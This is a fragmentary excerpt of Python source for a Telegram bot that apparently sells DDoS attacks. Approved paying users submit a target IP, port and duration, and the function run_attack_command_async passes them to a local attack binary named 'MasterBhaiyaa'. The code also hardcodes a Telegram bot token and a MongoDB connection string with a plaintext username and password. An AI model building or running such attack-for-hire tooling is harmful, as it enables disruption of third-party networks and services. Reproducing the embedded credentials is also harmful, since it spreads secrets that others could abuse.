...
TOKEN = '8131290387:AAHM8rU0AH8UOExv_dVaDJPBKiwceWX4gFI'
MONGO_URI = 'mongodb+srv://MasterBhaiyaa:MasterBhaiyaa@master.8aan4.mongodb.net/?retryWrites=true&w=majority&appName=Master'
FORWARD_CHANNEL_ID = -1002290780651
CHANNEL_ID = -1002290780651
error_channel_id = -1002290780651
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./MasterBhaiyaa {target_ip} {target_port} {duration} ")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @MasterBhaiyaa.*", parse_mode='Markdown')  # Contact owner message
            return
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @MasterBhaiyaa* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @MasterBhaiyaa* 🙏"  # Contact owner message
    else:
